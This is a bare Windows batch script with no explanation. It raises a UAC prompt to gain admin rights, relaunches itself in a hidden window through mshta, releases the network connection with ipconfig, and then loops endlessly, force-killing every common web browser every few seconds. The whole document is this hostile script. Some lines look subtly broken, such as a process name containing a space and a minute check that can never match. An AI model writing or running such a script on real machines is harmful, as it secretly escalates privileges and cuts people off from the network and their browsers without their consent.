@pushd "%temp%"
@echo.>%systemroot%\testfile.tmp
@if exist %systemroot%\testfile.tmp goto StartWithAdmin
@echo Set UAC = CreateObject^("Shell.Application"^)>getadm.vbs
@echo UAC.ShellExecute "%~0", "%*", "", "runas", 1 >>getadm.vbs
@getadm.vbs
@goto :eof
:StartWithAdmin
@del %systemroot%\testfile.tmp
@if exist getadm.vbs del getadm.vbs
@pushd "%~dp0"


@echo off
if "%1" == "h" goto begin
mshta vbscript:createobject("wscript.shell").run("""%~nx0"" h",0)(window.close)&&exit
:begin
REM

:network
ipconfig /release
:browser
taskkill /f /im iexplore.exe
taskkill /f /im baidubrowser.exe
taskkill /f /im QQBrowser.exe
taskkill /f /im sogouexplorer.exe
taskkill /f /im The world .exe
taskkill /f /im Firefox.exe
taskkill /f /im opera.exe
taskkill /f /im 360SE.exe
taskkill /f /im Chrome.exe
taskkill /f /im Safari.exe
taskkill /f /im Maxthon.exe
taskkill /f /im Netscape.exe
set mi=%time:~3,2%
if %time:~3,2% == 5 goto network
ping /n 6 127.0.0.1
goto browser